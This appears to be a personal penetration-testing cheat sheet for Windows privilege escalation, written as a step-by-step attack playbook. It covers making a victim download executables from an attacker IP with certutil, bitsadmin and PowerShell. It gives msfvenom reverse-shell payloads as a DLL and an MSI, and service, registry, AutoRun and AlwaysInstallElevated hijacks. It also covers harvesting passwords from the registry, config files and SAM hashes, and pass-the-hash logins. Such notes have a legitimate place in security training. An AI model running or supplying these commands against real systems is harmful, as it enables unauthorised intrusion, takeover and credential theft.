# General


### Winexe

we can connect to a windows shell using winexe

> winexe -U 'admin%password' //10.10.5.159 cmd.exe

If we want a system shell just provide a --system flaf in above command

# File Transfers

###  smb transfer 
 Run this following command on the directory including the file and this will start a smb share of that dir

> sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py sharename .

- Now on victim machine  

> copy \\IP\sharename\filename localpathwheretosave


to transfer the file from windows to linux

copy filename.exe \\IP\sharename

### Invoke web request transfer

Start a web server on our local machine and past the following command in victim shell

> powershell.exe iwr -uri 10.4.30.255/file.exe -o C:\Temp\file.exe

### CertUtil

Start a local web server and use followinv command on victim

> certutil -urlcache -f http://10.4.30.255/file.exe file.exe



### BitsAdmin

start a web server and use this command on victim

> bitsadmin /transfer job https://10.4.30.255/file.exe C:\Temp\file.exe



### Net.webclient

> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.4.30.255/file.exe', 'file.exe')

# Privilege escalation


## Service exploits


.\winpeas.exe quiet servicesinfo

      we have to replace the service names with names found on target from winpeas
### Insecure Service Permissions

this exploit is like path manipulation.WE see that if we have permissions to change settings of a certain service
and we can stop or start the service then we can poiny it to our malicious executable file and when we restart the service
our executable run as SYSTEM



we can use following command to see permissions of services using winpeas

> .\winpeas.exe servicesinfo

we get the services which we can possibly modify

Now we use accesschk.exe to see the which permissions we can abuse of that service

> .\accesschk.exe /accepteula -uwcqv username servicename

!!This vector only work if we have stop or start service permission available else its a rabithole.
!! The service must also have SERVICE_CHANGE_CONFIG which allows us to modify permissions


Now we can interact with service 

> sc qc servicename

!!The service must also have SERVICE_START_NAME set to system so we know it runs as SYSTEM.

Now we will change the BInarypath to  our executable

> sc config servicename binpath= "\"C:\PrivEsc\reverse.exe\""


We can see the status of service by

> sc query servicename

 If it is running then we have to stop the service and again start the service

If it is stopped then just start the service and our file will be executed

> net start servicename


### Unquoted service path

we can abuse this service due to insecure path validity in windows. service name is unquotedsvc
 suppose we have a path

c:\program files\common files\file.exe

when we run file.exe using absolute path,windows call unquotedsvc to check each possible directory to see if it is 
executable or not .That means first windows will check\program to see if  its an exectuable,if not then it will check
\common as executable and then like this we run our proper executable. So we cann add our executable before the original file
and execute that


Fist query the unquotedsvc to see if we have proper start,stop and system permission for the service

After confirming this we have to see which path is writable so we can write

we can find that by using.We gradually see all the partial directories to see if its writable .NOte this
c:\programfiles\unquotedpathserviece is just an example

> \accesschk.exe /accepteula -uwdq "C:\"

> \accesschk.exe /accepteula -uwdq "C:\Program Files\"

> \accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"  

Now just move our malicuous file to a writable path so its executed before the original

> copy exploit.exe "C:\Program Files\Unquoted Service Files\exploit.exe"


Now just start the unquotedsvc

> net start unquotedsvc 

### Weak registry permissions

- First identify the path which is vulnerbale to this attack

-then query it to see its inf0

> sc qc regsvc

SERVICE_START_NAME must be set to system so we know that root is runng the service

- Now we use accesschk to see which permissions we have

> .\accesschk /accepteula -uvwqk registrypath or regisrtry (conditianal)


now we point our executable to the registry config so it gets executed

> reg add weakregistrypath /v ImagePath /t REG_EXPAND_SZ /d pathtoourfile /f



### Writable insecure services

In this we usually exploit if any service being ran by system is writable by us 

We will simply overwrite the service with our code and then simpply restart it


First we check if we Authority permission on the service

> sc qz filepermsvc

Now we use accesschk to see if we have writa permission to service binary

> .\accesschk.exe /accepteula -quvw "Path to service"


If its writable then we overwrite it woth our malicius file

> copy maliciousfilepath  "service path" /Y


Now we restart the service

> net start filepermsvc

### DLL hijacking

This attack works when the dll service look for a dll file  in different paths in windows and if any path is writable by us
then we can simply create dll msfvenom payload and write to that path and when we start the dllservice that malicius
payload is loaded and run
to find the dll filename we have to need access to rfd and use process monitor

In winpeas output see if any dll path is writable

then query the dllservice to see if that is being run by System

> sc qc dllsvc

Now check our permission using accesschk

> .\accesschk /accepteula -uvqc username dllservicenmae

Now if we can start or stop the service then we will proceed

Now create a msfvenom payload for dll hijack in our linux and transfer it 

> mfsvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f dll -o hijack.dll

Now start the service

> net start dllsvc

## Registery Privesc


.\winpeas.exe quiet applicationsinfo

### AutoRuns

 In winpeas output we will see many different registry files which autorun on startup

And it will tell us if any of that service is wriytable by us
   OR

we can manually check the writable query  by


>  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Now we will have few files and we will manually check them by using accesschk if we can write to it

> .\accesschk.exe /accepteula -wvu "FilePath"

Now copy the orignal registry file for backup and transfer our malicous file to that location with that name 
so that poiosned file is loaded when registry is loaded
 
> copy "Registryfilepath" c:\Temp

Now overwrite the registry with our reverse shell

> copy OURfilePath "RegistryPath" /Y


In windows 10 , the user with which we restart the pc the registry is run by privelege of that user
so we will need to login as admin on rdp and then restart so the reegistry gets executed as admin


IN real life engagement we will have to wait for administrator to restart the pc




### Always Install Elevated

.\winpeas.exe quiet windowscreds


In this we usually run a msi package which is our reverse shell and this happens when the system allows
the current user to run msi files as privilged user


TO check manually: 

we need two options to be enable for this
These both need to be set  to 1 to work

1. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
2. reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated



WInpeas will highlight for us if these options are enabled

Now all we need to do is just create a msfvenom payload and execute it

> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.30.255 LPORT=6969 -f msi -o reverse.msi


Now transfer the file and just execute it


> msiexec /quiet /qn /i PATHTOMSIFILE




## Passwords

After finding passwords , we can use winexe to login just like ssh 


#### Registry passwords

.\winpeas.exe quiet filesinfo usersinfo

we can find credentials in configuration files,registry keys etc

The following command will display all the contents having password keyword in registry

> reg query HKLM /f password /t REG_SZ /s

Autologon registry is an important registry and we can target this specific registory so we get less output

> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

Now  we can connect to windows shelljust like ssh using the credrntials using a service known as winexe

> winexe -U 'admin%password' //10.10.5.159 cmd.exe

#### Saved Credentials

.\winpeas.exe quiet cmd windowscred

Windows save credentials of some user so other user can run some commands on behlaf of that user similiar to sudo
 we can use these saved credentials to run commands as admin user
.
Run the command to see which users credntials are saved

> cmdkey /list

Now we will use runas command to execute any command as the admin

> runas /savecred /user:SavedUsername ANYCOMMAND

We can run our reverse shell as admin and get root shell

#### Searching config files for passwords

Below winpeas flag may find possible locations for credentials leakage

> .\winpeas.exe quiet cmd searchfast filesinfo

This command will find for files having pass in its name or ending with .config extension

> dir /s *pass* == *.config

This command search files contents for word password and specified file extension
Instead of running this in system root directory , run this command in users home dir or weird 
directories where you think passswords are possible


> findstr /si password *.xml *.ini *.txt

#### SAM passwords

Possible SAM locations

> .\winpeas.exe quiet cmd searchfast filesinfo

SAM is a local database in windows which store user passwords hashes. It requires a key which is stored in a file named 
SYSTEM .If we have both we can extract the hashes on our machine and crack using john the ripper

SAM files are located in c:\windows\system32\config

Backups maybe in c:\windows\system32\config\REgback ,   c:\windows\repair

 We copy the sam and system files on our machine and then use creddump7 to dump the hashes

https://github.com/CiscoCXSecurity/creddump7.git

we need a python module

pip3 install pycrypto

Now just use the pwdump.py as

> python pwdump.py SYSTEM SAM

we can also use impacket secretsdump.py




### Passing the hash


ntlm hash format is

> **username:salt:LM:NTLM:::**

when cracking hashes we only use the ntlm part

 Whenever we find hashes, we can use them directly sometiems instead of decrypting them
 
we can use the hash in winexe command replacing the passowrd position.

we specify the LM and NTLM part of the hash

we use  a modified version of winexe called pth-winexe

> pth-winexe -U'admin%LM:NTLM' //10.4.30.255 cmd.exe

If we want a  system shell we simply provide a --systm flag
